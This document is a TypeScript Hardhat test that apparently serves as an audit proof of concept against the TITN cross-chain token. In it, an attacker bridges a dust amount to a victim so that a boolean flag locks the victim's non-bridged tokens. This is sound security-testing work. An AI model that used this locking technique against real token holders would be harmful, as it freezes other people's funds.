it('malicious user can bridged token to others to lock thier non-bridged tokens', async function () {
    const attacker = user1
    const victim = user2

    // mint non-bridged TITN to victim (Base)
    const victimNonBridgedTokens = ethers.utils.parseEther('1')
    await baseTITN.connect(ownerA).transfer(victim.address, victimNonBridgedTokens)
    expect(await baseTITN.isBridgedTokenHolder(victim.address)).false

    // mint TITN to attacker (Arb)
    // await arbTITN.connect(ownerB).transfer(attacker.address, ethers.utils.parseEther('1'))
    const attackerTokens = ethers.utils.parseEther('1')
    const options = Options.newOptions().addExecutorLzReceiveOption(200000, 0).toHex().toString()
    const sendParam = [
        eidB,
        ethers.utils.zeroPad(attacker.address, 32), // to attacker
        attackerTokens,
        attackerTokens,
        options,
        '0x',
        '0x',
    ]
    const [nativeFee] = await baseTITN.quoteSend(sendParam, false)
    await baseTITN.send(sendParam, [nativeFee, 0], ownerA.address, { value: nativeFee })

    // Attacker bridges 1 wei to Victim
    const tokensToSend = ethers.utils.parseEther('.000001')
    const attacksSendParam = [
        eidA,
        ethers.utils.zeroPad(victim.address, 32), // to victim
        tokensToSend,
        tokensToSend,
        options,
        '0x',
        '0x',
    ]
    const [attacksNativeFee] = await arbTITN.quoteSend(attacksSendParam, false)
    await arbTITN
        .connect(attacker)
        .send(attacksSendParam, [nativeFee, 0], attacker.address, { value: attacksNativeFee })

    // POC: Victim attempts to transfer non-bridged tokens, Fails due to boolean flag.
    expect(await baseTITN.isBridgedTokenHolder(victim.address)).true
    try {
        await arbTITN.connect(victim).transfer(ownerB.address, victimNonBridgedTokens)
        expect.fail('Transaction should have reverted')
    } catch (error: any) {
        expect(error.message).to.include('BridgedTokensTransferLocked')
    }
})